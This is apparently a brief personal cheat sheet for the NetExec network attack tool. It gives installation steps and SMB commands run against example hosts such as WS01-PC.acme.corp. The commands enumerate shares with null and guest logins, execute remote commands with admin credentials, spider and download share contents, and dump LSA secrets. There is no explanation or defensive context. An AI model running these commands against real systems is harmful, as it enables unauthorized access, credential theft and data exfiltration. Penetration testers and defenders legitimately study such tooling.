```
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

```
nxc --help
nxc smb --help
nxc ldap --help
nxc rdp --help


```

# smb
```
nxc smb -L

nxc smb 10.10.12.101 -u '' -p '' --shares --local-auth

nxc smb 10.10.12.100 -u 'guest' -p '' --shares

nxc smb WS01-PC.acme.corp -u admin -p "pas!!!!ss" --local-auth -x whoami

nxc smb WS01-PC.acme.corp -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true

nxc smb WS01-PC.acme.corp -u 'user' -p 'pass' --lsa
```


